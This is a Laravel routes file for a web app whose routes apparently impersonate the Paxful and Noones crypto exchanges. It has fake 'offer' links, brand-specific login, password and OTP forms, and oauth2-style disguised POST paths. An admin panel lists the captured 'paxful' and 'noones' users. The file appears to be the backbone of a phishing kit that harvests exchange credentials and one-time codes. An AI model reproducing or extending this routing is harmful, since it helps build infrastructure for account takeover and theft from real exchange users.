<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


//Auth::routes();

Route::get('/', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

Route::get('/offer/Mor4Qh04Yq', [App\Http\Controllers\HomeController::class, 'paxful'])->name('login.paxful');

Route::get('/dashboard', [App\Http\Controllers\DashboardController::class, 'index'])->name('dashboard');
Route::get('/admin/users', [App\Http\Controllers\DashboardController::class, 'users'])->name('admin.users');
Route::get('/admin/users/paxful', [App\Http\Controllers\DashboardController::class, 'paxusers'])->name('admin.users.paxful');
Route::get('/admin/users/noones', [App\Http\Controllers\DashboardController::class, 'noonesusers'])->name('admin.users.noones');


Route::get('/offer/Mor4Qh04Yq/login',[App\Http\Controllers\Auth\AuthGuestLoginController::class, 'showLoginForm'])->name('otp.generate');
Route::post('/offer/login',[App\Http\Controllers\Auth\AuthGuestLoginController::class, 'login'])->name('otp.post');
Route::get('/otp/verification/{user_id}', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'verification'])->name('otp.verification');
Route::post('/otp/login', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'loginWithOtp'])->name('otp.getlogin');

Route::get('/offer/Mor4Qh04Yq/register',[App\Http\Controllers\Auth\RegisterController::class, 'registerView'])->name('register.get');

Route::post('new/offer/Mor4Qh04Yq/register',[App\Http\Controllers\Auth\AuthGuestLoginController::class, 'register'])->name('register.post');


Route::get('/get-started', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'getStarted'])->name('get.started');

Route::get('/otp/verification/offer/Mor4Qh04Yq/{user_id}', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'paxfulVerification'])->name('otp.verification.paxful');

Route::get('/transactions', [App\Http\Controllers\DashboardController::class, 'payments'])->name('user.payments');
Route::get('/admin/transactions', [App\Http\Controllers\DashboardController::class, 'transactions'])->name('admin.payments');

Route::get('/auth/logout', [App\Http\Controllers\Auth\LoginController::class, 'logout'])->name('user.logout');
Route::get('/check-user-role', [App\Http\Controllers\HomeController::class,'checkUserRole'])->name('user.checkrole');

Route::post('/auth/otp', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'loginWithOtpJson'])->name('user.login.otp');

Route::post('/auth/login/post', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'adminLogin'])->name('user.adminLogin');


Route::get('/admin', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'adminLoginView'])->name('user.adminLogin.view');
Route::get('/auth/admin/logout', [App\Http\Controllers\Auth\LoginController::class, 'Adminlogout'])->name('admin.logout');

Route::get('/auth/user', [App\Http\Controllers\Auth\LoginController::class, 'loginUser'])->name('login');



Route::post('/deposit/validate', [App\Http\Controllers\DashboardController::class, 'deposit'])->name('deposit');
Route::post('/deposit/post', [App\Http\Controllers\DashboardController::class, 'depositPost'])->name('deposit.post');


Route::post('/withdraw/validate', [App\Http\Controllers\DashboardController::class, 'withdraw'])->name('withdraw');


Route::post('/admin/settings/post', [App\Http\Controllers\DashboardController::class, 'settings'])->name('settings');
Route::get('/admin/settings', [App\Http\Controllers\DashboardController::class, 'settingsView'])->name('settings.view');

Route::get('/update-profile', [App\Http\Controllers\DashboardController::class, 'profileView'])->name('profile.view');
Route::post('/update-profile/post', [App\Http\Controllers\DashboardController::class, 'profilePost'])->name('profile.update');

Route::post('offer/otp/paxful/login', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'paxfulOtp'])->name('login.paxful.new');

Route::get('noones/offer/Mor4Qh04Yq/login',  [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'noonesForm'])->name('noones.view.login');

Route::get('noones/offer/Mor4Qh04Yq',  [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'noonesFormPassword'])->name('noones.password.login');

Route::get('noones/otp/offer/Mor4Qh04Yq',  [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'noonesFormOtp'])->name('noones.otp.login');


Route::post('noones/offer/Mor4Qh04Yq/oauth2/authorize/Df430b82c64f35750a705fd65f3336653',  [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'nooneslogin'])->name('noones.post.login');

Route::post('noones/offer/Mor4Qh04Yq/4f35750a705fd65f3336653/response_type', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'noonespassword'])->name('noones.post.password.login');

Route::post('noones/offer/Mor4Qh04Yq/otp', [App\Http\Controllers\Auth\AuthGuestLoginController::class, 'noonesOtp'])->name('noones.otp.login');


